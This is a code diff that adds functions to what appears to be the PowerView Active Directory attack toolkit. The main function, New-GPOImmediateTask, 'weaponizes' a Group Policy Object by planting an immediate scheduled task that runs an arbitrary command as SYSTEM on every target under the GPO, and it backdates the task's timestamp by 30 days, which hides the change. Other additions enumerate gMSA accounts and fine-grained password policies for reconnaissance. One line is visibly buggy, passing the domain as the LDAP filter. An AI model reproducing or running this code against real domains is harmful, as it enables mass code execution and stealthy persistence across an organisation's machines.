+.PARAMETER TaskRunAs
+
+The security context under which the task is run, defaults to 'NT AUTHORITY\System'.
+
+.PARAMETER TaskLogonType
+
+The logon type used by the task (mainly S4U or InteractiveToken), defaults to 'S4U'.
+
+.PARAMETER TaskRunLevel
+
+The privilege level asked for by the task, defaults to 'HighestAvailable'
+
+.PARAMETER TaskModifiedDate
+
+The displayed modified date for the task, defaults to 30 days ago.
+
+.PARAMETER GPO
+
+A display name (e.g. 'Test GPO'), DistinguishedName (e.g. 'CN={F260B76D-55C8-46C5-BEF1-9016DD98E272},CN=Policies,CN=System,DC=testlab,DC=local'),
+GUID (e.g. '10ec320d-3111-4ef4-8faf-8f14f4adc789'), or GPO name (e.g. '{F260B76D-55C8-46C5-BEF1-9016DD98E272}').
+
+.PARAMETER Domain
+
+The domain to query for the GPOs, defaults to the current domain.
+
+.PARAMETER SearchBase
+
+The LDAP source to search through
+e.g. "LDAP://cn={8FF59D28-15D7-422A-BCB7-2AE45724125A},cn=policies,cn=system,DC=dev,DC=testlab,DC=local"
+
+.PARAMETER Credential
+
+A [Management.Automation.PSCredential] object of alternate credentials
+for connection to the target.
+
+.PARAMETER SearchBase
+
+The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
+Useful for OU queries.
+
+.PARAMETER Server
+
+Specifies an Active Directory server (domain controller) to bind to.
+
+.PARAMETER SearchScope
+
+Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
+
+.PARAMETER ServerTimeLimit
+
+Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
+
+.PARAMETER Target
+
+Specifies if the immediate task will be configure for the user or machine part of the GPO.
+
+.EXAMPLE
+
+PS> New-GPOImmediateTask -TaskName Debugging -GPO SecurePolicy -CommandArguments '-c "123 | Out-File C:\Temp\debug.txt"' -Force
+
+Create an immediate schtask that executes the specified PowerShell arguments and
+push it out to the 'SecurePolicy' GPO, skipping the confirmation prompt.
+
+.EXAMPLE
+
+PS> New-GPOImmediateTask -GPO SecurePolicy -TaskName MyTask -Remove -Force
+
+Remove immediate task named 'MyTask' from the 'SecurePolicy' GPO, skipping the confirmation prompt.
+#>
+    [CmdletBinding(DefaultParameterSetName = 'Create')]
+    Param (
+
+        [Parameter(ParameterSetName = 'Create', Mandatory = $True)]
+        [Parameter(ParameterSetName = 'Remove', Mandatory = $True)]
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $TaskName,
+
+        [Parameter(ParameterSetName = 'Create')]
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $Command = 'powershell',
+
+        [Parameter(ParameterSetName = 'Create')]
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $CommandArguments,
+
+        [Parameter(ParameterSetName = 'Create')]
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $TaskDescription = '',
+
+        [Parameter(ParameterSetName = 'Create')]
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $TaskAuthor = 'NT AUTHORITY\System',
+
+        [Parameter(ParameterSetName = 'Create')]
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $TaskRunAs = 'NT AUTHORITY\System',
+
+        [Parameter(ParameterSetName = 'Create')]
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $TaskLogonType = 'S4U',
+
+        [Parameter(ParameterSetName = 'Create')]
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $TaskRunLevel = 'HighestAvailable',
+
+        [Parameter(ParameterSetName = 'Create')]
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $TaskModifiedDate = (Get-Date (Get-Date).AddDays(-30) -Format u).trim("Z"),
+
+        [Parameter(ParameterSetName = 'Create')]
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $TaskGuid = [Guid]::NewGuid(),
+
+        [Parameter(ParameterSetName = 'Create')]
+        [Parameter(ParameterSetName = 'Remove')]
+        [String]
+        $GPO,
+
+        [Parameter(ParameterSetName = 'Create')]
+        [Parameter(ParameterSetName = 'Remove')]
+        [ValidateSet('Machine','User')]
+        [String]
+        $Target = 'Machine',
+
+        [Parameter(ParameterSetName = 'Create')]
+        [Parameter(ParameterSetName = 'Remove')]
+        [String]
+        $Domain,
+
+        [Parameter(ParameterSetName = 'Create')]
+        [Parameter(ParameterSetName = 'Remove')]
+        [Management.Automation.PSCredential]
+        $Credential,
+
+        [Parameter(ParameterSetName = 'Create')]
+        [Parameter(ParameterSetName = 'Remove')]
+        $LDAPFilter,
+
+        [Parameter(ParameterSetName = 'Create')]
+        [Parameter(ParameterSetName = 'Remove')]
+        [String]
+        $SearchBase,
+
+        [Parameter(ParameterSetName = 'Create')]
+        [Parameter(ParameterSetName = 'Remove')]
+        [String]
+        $Server,
+
+        [Parameter(ParameterSetName = 'Create')]
+        [Parameter(ParameterSetName = 'Remove')]
+        [String]
+        $SearchScope,
+
+        [Parameter(ParameterSetName = 'Create')]
+        [Parameter(ParameterSetName = 'Remove')]
+        [String]
+        $ServerTimeLimit,
+
+        [Parameter(ParameterSetName = 'Create')]
+        [Parameter(ParameterSetName = 'Remove')]
+        [Switch]
+        $Force,
+
+        [Parameter(ParameterSetName = 'Remove')]
+        [Switch]
+        $Remove
+    )
+
+    BEGIN {
+        $SearcherArguments = @{}
+        if ($PSBoundParameters['GPO']) { $SearcherArguments['Identity'] = $GPO }
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $Domain }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+    }
+
+    PROCESS {
+        # enumerate the specified GPO(s)
+        $GPOs = Get-DomainGPO @SearcherArguments -Raw
+
+        if(!$GPOs) {
+            Write-Warning '[New-GPOImmediateTask] No GPO found.'
+            return
+        }
+
+        ForEach($GPORaw in $GPOs) {
+            $GPOEntry = $GPORaw.GetDirectoryEntry()
+            $ProcessedGPOName = $GPOEntry.Name
+            Write-Verbose "[New-GPOImmediateTask] Trying to weaponize GPO: $ProcessedGPOName"
+
+            $TaskPath = Join-Path $GPOEntry.gPCFileSysPath "\$Target\Preferences\ScheduledTasks\"
+            $TaskXMLPath = Join-Path $TaskPath "\ScheduledTasks.xml"
+
+            if($Remove) {
+                if (!$Force -and !$psCmdlet.ShouldContinue('Do you want to continue?',"Removing schtask at $TaskXMLPath")) {
+                    return
+                }
+
+                if (Test-Path $TaskXMLPath) {
+                    # remove our immediate task from scheduled tasks XML file
+                    $TaskXML = [xml](Get-Content -Path $TaskXMLPath -Encoding ASCII)
+                    $OldImmediateTasks = $TaskXML.ScheduledTasks.ImmediateTaskV2 | where name -eq $TaskName
+                    ForEach ($OldImmediateTask in $OldImmediateTasks) {
+                        $Null = $TaskXML.ScheduledTasks.RemoveChild($OldImmediateTask)
+                    }
+                    $TaskXML.Save($TaskXMLPath)
+
+                    if ($TaskXML.ScheduledTasks.ChildNodes.Count -eq 0) {
+                        Remove-Item -Path $TaskXMLPath -Force
+
+                        # remove GUID for ImmediateTask from gPCMachineExtensionNames
+                        # or gPCUserExtensionNames
+                        if ($Target -eq "Machine") {
+                            $extensionNames = "gPCMachineExtensionNames"
+                        } else {
+                            $extensionNames = "gPCUserExtensionNames"
+                        }
+
+                        $ZeroGuid = "00000000-0000-0000-0000-000000000000"
+                        $ScheduledTasksCSEGuid = "CAB54552-DEEA-4691-817E-ED4A4D1AFC72"
+                        $ScheduledTasksTEGuid = "AADCED64-746C-4633-A97C-D61349046527"
+
+                        if ($GPOEntry.Properties[$extensionNames] -and $GPOEntry.Properties[$extensionNames].Value.ToString().Contains($ScheduledTasksCSEGuid)) {
+                            $OldExtensionNames = $GPOEntry.Properties[$extensionNames].Value.ToString()
+                            $OldGUIDSplit = $OldExtensionNames.Split('][',[System.StringSplitOptions]::RemoveEmptyEntries)
+
+                            $OldGUIDs = New-Object System.Collections.ArrayList
+                            ForEach ($GUIDs in $OldGUIDSplit) {
+                                $GUIDs = $GUIDs.Split("}{",[System.StringSplitOptions]::RemoveEmptyEntries) -replace "[\{\[\]]", ""
+                                $OldGUID = New-Object System.Collections.ArrayList(,$GUIDs)
+                                $Null = $OldGUIDs.Add($OldGUID)
+                            }
+
+                            $NewGUIDs = New-Object System.Collections.ArrayList
+
+                            ForEach ($OldGUID in $OldGUIDs) {
+                                # updating CSE GUID
+                                if ($OldGUID.Contains($ZeroGuid) -and $OldGUID.Contains($ScheduledTasksCSEGuid)) {
+                                    $Null = $OldGUID.Remove($ScheduledTasksCSEGuid)
+                                    if ($OldGUID.Count -gt 1) {
+                                        $OldGUID = $OldGUID | Sort-Object
+                                        $Null = $NewGUIDs.Add($OldGUID)
+                                    }
+                                # updating tool extension GUID for ScheduledTasks
+                                } elseif (!($OldGUID.Contains($ScheduledTasksTEGuid) -and $OldGUID.Contains($ScheduledTasksCSEGuid))) {
+                                    $Null = $NewGUIDs.Add($OldGUID)
+                                }
+                            }
+
+                            if ($NewGUIDs.Count -gt 0) {
+                                $NewGUIDs = $NewGUIDs | Sort-Object
+
+                                # format for extensionNames field
+                                $FormatedGUIDs = New-Object System.Collections.ArrayList
+                                ForEach ($GUIDs in $NewGUIDs) {
+                                    $FormatedGUID = ""
+                                    ForEach ($GUID in $GUIDs) {
+                                        $FormatedGUID += "{"+$GUID+"}"
+                                    }
+                                    $FormatedGUID = "["+$FormatedGUID+"]"
+                                    $Null = $FormatedGUIDs.Add($FormatedGUID)
+                                }
+                                $NewGUIDsString = -Join $FormatedGUIDs
+
+                                Write-Verbose "[New-GPOImmediateTask] New extensionNames $NewGUIDsString"
+
+                                $GPOEntry.Properties[$extensionNames].Value = $NewGUIDsString
+                            } else {
+                                $GPOEntry.Properties[$extensionNames].Clear()
+                            }
+                        }
+                    }
+                }
+            }
+            else {
+                if (!$Force -and !$psCmdlet.ShouldContinue('Do you want to continue?',"Creating schtask at $TaskXMLPath")) {
+                    return
+                }
+
+                # create the folder if it doesn't exist
+                $Null = New-Item -ItemType Directory -Force -Path $TaskPath
+
+                # build the XML spec for our 'immediate' scheduled task
+                [xml] $ImmediateTaskXML = '<ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="'+$TaskName+'" image="0" changed="'+$TaskModifiedDate+'" uid="{'+$TaskGuid+'}"><Properties action="C" name="'+$TaskName+'" runAs="'+$TaskRunAs+'" logonType="'+$TaskLogonType+'"><Task version="1.3"><RegistrationInfo><Author>'+$TaskAuthor+'</Author><Description>'+$TaskDescription+'</Description></RegistrationInfo><Principals><Principal id="Author"><UserId>'+$TaskRunAs+'</UserId><LogonType>'+$TaskLogonType+'</LogonType><RunLevel>'+$TaskRunLevel+'</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>false</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context="Author"><Exec><Command>'+$Command+'</Command><Arguments>'+$CommandArguments+'</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2>'
+
+                # add our immediate task in scheduled tasks XML file
+                if (Test-Path $TaskXMLPath) {
+                    $TaskXML = [xml](Get-Content -Path $TaskXMLPath -Encoding ASCII)
+                    if ($TaskXML.ScheduledTasks.ImmediateTaskV2 | where name -eq $TaskName) {
+                        if (!$Force -and !$psCmdlet.ShouldContinue('Do you want to continue?',"Overwritting immediate task named $TaskName")) {
+                            return
+                        }
+                        $OldImmediateTasks = $TaskXML.ScheduledTasks.ImmediateTaskV2 | where name -eq $TaskName
+                        ForEach ($OldImmediateTask in $OldImmediateTasks) {
+                            $Null = $TaskXML.ScheduledTasks.RemoveChild($OldImmediateTask)
+                        }
+                    }
+                } else {
+                    [xml] $TaskXML = [xml] '<?xml version="1.0" encoding="utf-8"?><ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}"></ScheduledTasks>'
+                }
+                $Null = $TaskXML.ScheduledTasks.AppendChild($TaskXML.ImportNode($ImmediateTaskXML.ImmediateTaskV2, $true))
+                $TaskXML.Save($TaskXMLPath)
+
+                # add GUID for ImmediateTask in gPCMachineExtensionNames or
+                # gPCUserExtensionNames
+                if ($Target -eq "Machine") {
+                    $extensionNames = "gPCMachineExtensionNames"
+                } else {
+                    $extensionNames = "gPCUserExtensionNames"
+                }
+
+                $ZeroGuid = "00000000-0000-0000-0000-000000000000"
+                $ScheduledTasksCSEGuid = "CAB54552-DEEA-4691-817E-ED4A4D1AFC72"
+                $ScheduledTasksTEGuid = "AADCED64-746C-4633-A97C-D61349046527"
+
+                if (!$GPOEntry.Properties[$extensionNames]) {
+                    $GPOEntry.Properties[$extensionNames].Value = "[{"+$ZeroGuid+"}{"+$ScheduledTasksCSEGuid+"}]"+"[{"+ $ScheduledTasksTEGuid+"}{"+$ScheduledTasksCSEGuid+"}]"
+                } elseif (!$GPOEntry.Properties[$extensionNames].Value.ToString().Contains($ScheduledTasksCSEGuid)) {
+                    $OldExtensionNames = $GPOEntry.Properties[$extensionNames].Value.ToString()
+                    $OldGUIDSplit = $OldExtensionNames.Split('][',[System.StringSplitOptions]::RemoveEmptyEntries)
+
+                    $OldGUIDs = New-Object System.Collections.ArrayList
+                    ForEach ($GUIDs in $OldGUIDSplit) {
+                        $GUIDs = $GUIDs.Split("}{",[System.StringSplitOptions]::RemoveEmptyEntries) -replace "[\{\[\]]", ""
+                        $OldGUID = New-Object System.Collections.ArrayList(,$GUIDs)
+                        $Null = $OldGUIDs.Add($OldGUID)
+                    }
+
+                    $NewGUIDs = New-Object System.Collections.ArrayList
+
+                    # add CSE GUID
+                    if (!$OldExtensionNames.Contains($ZeroGuid)) {
+                        $Null = $OldGUIDs.Add(@($ZeroGuid, $ScheduledTasksCSEGuid))
+                    }
+
+                    # add tool extension GUID for ScheduledTasks
+                    if (!$OldExtensionNames.Contains($ScheduledTasksTEGuid)) {
+                        $Null = $OldGUIDs.Add(@($ScheduledTasksTEGuid, $ScheduledTasksCSEGuid))
+                    }
+
+                    ForEach ($OldGUID in $OldGUIDs) {
+                        # updating CSE GUID
+                        if ($OldGUID.Contains($ZeroGuid) -and -not $OldGUID.Contains($ScheduledTasksCSEGuid)) {
+                            $Null = $OldGUID.Add($ScheduledTasksCSEGuid)
+                            $OldGUID = $OldGUID | Sort-Object
+                            $Null = $NewGUIDs.Add($OldGUID)
+                        # updating tool extension GUID for ScheduledTasks
+                        } elseif ($OldGUID.Contains($ScheduledTasksTEGuid) -and -not $OldGUID.Contains($ScheduledTasksCSEGuid)) {
+                            $Null = $OldGUID.Add($ScheduledTasksCSEGuid)
+                            $OldGUID = $OldGUID | Sort-Object
+                            $Null = $NewGUIDs.Add($OldGUID)
+                        } else {
+                            $Null = $NewGUIDs.Add($OldGUID)
+                        }
+                    }
+
+                    $NewGUIDs = $NewGUIDs | Sort-Object
+
+                    # format for extensionNames field
+                    $FormatedGUIDs = New-Object System.Collections.ArrayList
+                    ForEach ($GUIDs in $NewGUIDs) {
+                        $FormatedGUID = ""
+                        ForEach ($GUID in $GUIDs) {
+                            $FormatedGUID += "{"+$GUID+"}"
+                        }
+                        $FormatedGUID = "["+$FormatedGUID+"]"
+                        $Null = $FormatedGUIDs.Add($FormatedGUID)
+                    }
+                    $NewGUIDsString = -Join $FormatedGUIDs
+
+                    Write-Verbose "[New-GPOImmediateTask] New extensionNames $NewGUIDsString"
+
+                    $GPOEntry.Properties[$extensionNames].Value = $NewGUIDsString
+                }
+            }
+
+            # update versionNumber
+            $NewVersionNumber = [Convert]::ToInt32($GPOEntry.Properties["versionNumber"].Value) + 1
+            $GPOEntry.Properties["versionNumber"].Value = $NewVersionNumber
+            Write-Verbose "[New-GPOImmediateTask] New versionNumber $NewVersionNumber"
+
+            $GPOEntry.CommitChanges()
+
+            # also update versionNumber in GPT.ini
+            $GPTPath = Join-Path $GPOEntry.gPCFileSysPath "\GPT.ini"
+            $GPTOldContent = Get-Content -Path $GPTPath
+            $GPTNewContent = $GPTOldContent -replace "Version=.*$","Version=$NewVersionNumber"
+            Set-Content -Encoding ASCII -PATH $GPTPath -Value $GPTNewContent
+        }
+    }
+}
 
 ########################################################
 #
@@ -20628,6 +21264,175 @@ Returns all GPO delegations on a given GPO.
         }
     }
 }
+
+function Get-NetGmsa {
+<#
+.SYNOPSIS
+Search for all Group Managed Service Accounts in AD.
+Author: Jean-Francois Maes (@jfmaes)  
+License: BSD 3-Clause  
+Required Dependencies: Get-DomainSearcher, Get-ObjectACL
+.DESCRIPTION
+.PARAMETER Domain
+Specifies the domain to use for the query, defaults to the current domain.
+.PARAMETER DomainController
+Specifies an Active Directory server (domain controller) to bind to.
+.PARAMETER Credential
+A [Management.Automation.PSCredential] object of alternate credentials
+for connection to the target domain.
+ .PARAMETER ADSpath
+        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
+        Useful for OU queries.
+    
+.OUTPUTS
+PowerView.GSMA
+Custom PSObject with translated gMSA property fields.
+#>
+
+    [CmdletBinding()]
+    Param (
+        [Parameter(ValueFromPipeline=$True)]
+        [String]
+        $gmsaName = '*',
+
+        [String]
+        $Domain,
+
+        [String]
+        $DomainController,
+
+        [String]
+        $ADSpath,
+
+        [Switch]
+        $FullData,
+
+        [ValidateRange(1,10000)] 
+        [Int]
+        $PageSize = 200,
+
+        [Management.Automation.PSCredential]
+        $Credential
+    )
+
+    begin {
+        $GMSASearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize
+    }
+    process {
+        if ($GMSASearcher) {
+                $GMSASearcher.filter="(&(ObjectClass=msDS-GroupManagedServiceAccount)(name=$gmsaName))"
+            }
+
+            try {
+                $GMSASearcher.FindAll() | Where-Object {$_} | ForEach-Object {
+                    if ($FullData) {
+                        # convert/process the LDAP fields for each result
+                        Convert-LDAPProperty -Properties $_.Properties
+                    }
+                    else { 
+                        # otherwise just returning the ADS paths of the OUs
+                        $_.properties.adspath
+                    }
+                }
+            }
+            catch {
+                Write-Warning $_
+            }
+        }
+  }
+
+
+function Test-Administrator  
+{  
+    $user = [Security.Principal.WindowsIdentity]::GetCurrent();
+    (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)  
+}
+
+
+function Get-FineGrainedPasswordPolicy {
+<#
+.SYNOPSIS
+Search for all Fine Grained password policies in AD. Function requires high integritry to return results
+Author: Jean-Francois Maes (@jfmaes)  
+License: BSD 3-Clause  
+Required Dependencies: Get-DomainSearcher, Get-ObjectACL
+.DESCRIPTION
+.PARAMETER Domain
+Specifies the domain to use for the query, defaults to the current domain.
+.PARAMETER DomainController
+Specifies an Active Directory server (domain controller) to bind to.
+.PARAMETER Credential
+A [Management.Automation.PSCredential] object of alternate credentials
+for connection to the target domain.
+ .PARAMETER ADSpath
+        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
+        Useful for OU queries.
+    
+.OUTPUTS
+PowerView.pwpol
+Custom PSObject with translated pwpol property fields.
+#>
+
+    [CmdletBinding()]
+    Param (
+        [Parameter(ValueFromPipeline=$True)]
+        [String]
+        $policyName = '*',
+
+        [String]
+        $Domain,
+
+        [String]
+        $DomainController,
+
+        [String]
+        $ADSpath,
+
+        [Switch]
+        $FullData,
+
+        [ValidateRange(1,10000)] 
+        [Int]
+        $PageSize = 200,
+
+        [Management.Automation.PSCredential]
+        $Credential
+    )
+
+    begin {
+        $FineGrainedSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize
+    }
+    process {
+    
+    $isadmin = Test-Administrator
+    if($isadmin){
+        if ($FineGrainedSearcher) {
+                $FineGrainedSearcher.filter="(&(ObjectClass=msDS-PasswordSettings)(Name=$policyName))"
+            }
+
+            try {
+                $FineGrainedSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
+                    if ($FullData) {
+                        # convert/process the LDAP fields for each result
+                        Convert-LDAPProperty -Properties $_.Properties
+                    }
+                    else { 
+              
+                        $_.properties.adspath
+                    }
+                }
+            }
+            catch {
+                Write-Warning $_
+            }
+        }
+         else{
+    Write-Warning 'Get-FineGrainedPasswordPolicy will only work when run from high integrity context.'
+    }
+    }
+   
+  }
+
 
 
 ########################################################
